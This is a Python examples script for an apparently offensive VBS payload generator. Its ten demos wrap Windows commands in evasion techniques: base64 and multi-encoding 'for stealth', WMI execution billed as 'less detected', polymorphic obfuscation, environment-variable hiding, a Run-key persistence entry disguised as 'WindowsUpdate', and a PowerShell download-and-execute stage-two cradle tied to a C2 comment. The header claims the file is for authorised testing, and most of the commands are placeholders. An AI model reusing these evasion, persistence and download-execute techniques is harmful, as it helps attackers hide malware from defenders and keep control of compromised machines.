#!/usr/bin/env python3
"""
Example payloads and usage demonstrations
For authorized security testing and research
"""

from payload_generator import PayloadGenerator


def example_1_basic_command_execution():
    """Example 1: Execute a simple command"""
    print("=" * 60)
    print("Example 1: Basic Command Execution")
    print("=" * 60)

    gen = PayloadGenerator()
    cmd = "cmd /c echo Security Test"

    print("\n[*] Command:", cmd)
    print("\n[*] Using basic technique:")
    payload = gen.generate(cmd, technique="basic")
    print(payload)

    print("\n[*] Using base64 obfuscation:")
    payload = gen.generate(cmd, technique="base64")
    print(payload)


def example_2_powershell_execution():
    """Example 2: PowerShell command execution"""
    print("\n" + "=" * 60)
    print("Example 2: PowerShell Execution")
    print("=" * 60)

    gen = PayloadGenerator()
    cmd = 'powershell.exe -NoProfile -WindowStyle Hidden -Command "Write-Host \'Test\'"'

    print("\n[*] Command:", cmd)
    print("\n[*] Using WMI technique (less detected):")
    payload = gen.generate(cmd, technique="wmi")
    print(payload)

    print("\n[*] Using registry storage:")
    payload = gen.generate(cmd, technique="registry")
    print(payload)


def example_3_multi_stage_payload():
    """Example 3: Multi-stage payload download and execution"""
    print("\n" + "=" * 60)
    print("Example 3: Multi-Stage Payload")
    print("=" * 60)

    gen = PayloadGenerator()
    # This would normally fetch from your C2 or test server
    cmd = (
        'powershell.exe -NoProfile -Command '
        '"(New-Object Net.WebClient).DownloadFile(\'http://localhost:8000/stage2.ps1\','
        '\'$env:temp\\\\stage2.ps1\'); & $env:temp\\\\stage2.ps1"'
    )

    print("\n[*] Multi-stage download and execution")
    print("\n[*] Using multi-encoding for stealth:")
    payload = gen.generate(cmd, technique="multi_encoding")
    print(payload[:500] + "..." if len(payload) > 500 else payload)


def example_4_registry_persistence():
    """Example 4: Registry persistence mechanism"""
    print("\n" + "=" * 60)
    print("Example 4: Registry Persistence")
    print("=" * 60)

    gen = PayloadGenerator()
    # Add to Run key for persistence
    cmd = (
        "cmd /c reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run "
        "/v WindowsUpdate /d \"powershell -Command Write-Host test\" /f"
    )

    print("\n[*] Registry persistence command")
    print("\n[*] Using registry technique:")
    payload = gen.generate(cmd, technique="registry")
    print(payload)


def example_5_environment_variable_hiding():
    """Example 5: Command hidden in environment variables"""
    print("\n" + "=" * 60)
    print("Example 5: Environment Variable Obfuscation")
    print("=" * 60)

    gen = PayloadGenerator()
    cmd = "powershell.exe -Command Get-Process"

    print("\n[*] Using environment variable storage for stealth:")
    payload = gen.generate(cmd, technique="env")
    print(payload[:500] + "..." if len(payload) > 500 else payload)


def example_6_wmi_execution():
    """Example 6: WMI-based execution (less commonly detected)"""
    print("\n" + "=" * 60)
    print("Example 6: WMI Process Execution")
    print("=" * 60)

    gen = PayloadGenerator()
    cmd = "C:\\\\Windows\\\\System32\\\\cmd.exe /c powershell.exe -NoProfile -Command Test-Path $env:temp"

    print("\n[*] WMI execution (Win32_Process):")
    payload = gen.generate(cmd, technique="wmi")
    print(payload)


def example_7_obfuscated_function_calls():
    """Example 7: Obfuscated function names"""
    print("\n" + "=" * 60)
    print("Example 7: Obfuscated Function Calls")
    print("=" * 60)

    gen = PayloadGenerator()
    cmd = "cmd /c whoami"

    print("\n[*] With obfuscated function names (string concatenation):")
    payload = gen.generate(cmd, technique="obfuscated_calls")
    print(payload)


def example_8_all_techniques():
    """Example 8: Show all available techniques for comparison"""
    print("\n" + "=" * 60)
    print("Example 8: All Available Techniques")
    print("=" * 60)

    gen = PayloadGenerator()
    cmd = "cmd /c echo Test"

    print("\n[*] Available techniques:")
    for technique in gen.list_techniques():
        info = gen.get_technique_info(technique)
        print(f"  - {technique:<20} : {info}")


def example_9_high_obfuscation():
    """Example 9: High obfuscation level with polymorphic wrapper"""
    print("\n" + "=" * 60)
    print("Example 9: High Obfuscation with Polymorphism")
    print("=" * 60)

    gen = PayloadGenerator()
    cmd = "powershell.exe -Command Get-Content $env:temp\\\\test.txt"

    print("\n[*] Using high obfuscation (polymorphic wrapper):")
    payload = gen.generate(cmd, technique="hidden_execution", obfuscation_level="high")
    print(payload[:500] + "..." if len(payload) > 500 else payload)
    print(f"\n[*] Total payload size: {len(payload)} bytes")


def example_10_file_writer_injection():
    """Example 10: Write command to file then execute"""
    print("\n" + "=" * 60)
    print("Example 10: File Writer Injection")
    print("=" * 60)

    gen = PayloadGenerator()
    cmd = "powershell.exe -Command \"Write-Host \\\"Security Testing\\\"; Get-Date\""

    print("\n[*] Writing command to temp file then executing:")
    payload = gen.generate(cmd, technique="filewriter")
    print(payload)


if __name__ == "__main__":
    import sys

    if len(sys.argv) > 1:
        example_num = sys.argv[1]
        examples = {
            "1": example_1_basic_command_execution,
            "2": example_2_powershell_execution,
            "3": example_3_multi_stage_payload,
            "4": example_4_registry_persistence,
            "5": example_5_environment_variable_hiding,
            "6": example_6_wmi_execution,
            "7": example_7_obfuscated_function_calls,
            "8": example_8_all_techniques,
            "9": example_9_high_obfuscation,
            "10": example_10_file_writer_injection,
        }

        if example_num in examples:
            examples[example_num]()
        else:
            print("Usage: python examples.py [1-10]")
    else:
        print("VBS Payload Generation Examples")
        print("==============================\n")
        print("Run individual examples:")
        print("  python examples.py 1   - Basic command execution")
        print("  python examples.py 2   - PowerShell execution")
        print("  python examples.py 3   - Multi-stage payload")
        print("  python examples.py 4   - Registry persistence")
        print("  python examples.py 5   - Environment variable hiding")
        print("  python examples.py 6   - WMI execution")
        print("  python examples.py 7   - Obfuscated function calls")
        print("  python examples.py 8   - List all techniques")
        print("  python examples.py 9   - High obfuscation")
        print("  python examples.py 10  - File writer injection")
        print("\nOr run all examples: python examples.py all")

        if len(sys.argv) > 1 and sys.argv[1] == "all":
            for i in range(1, 11):
                try:
                    locals()[f"example_{i}_"]()
                except:
                    pass
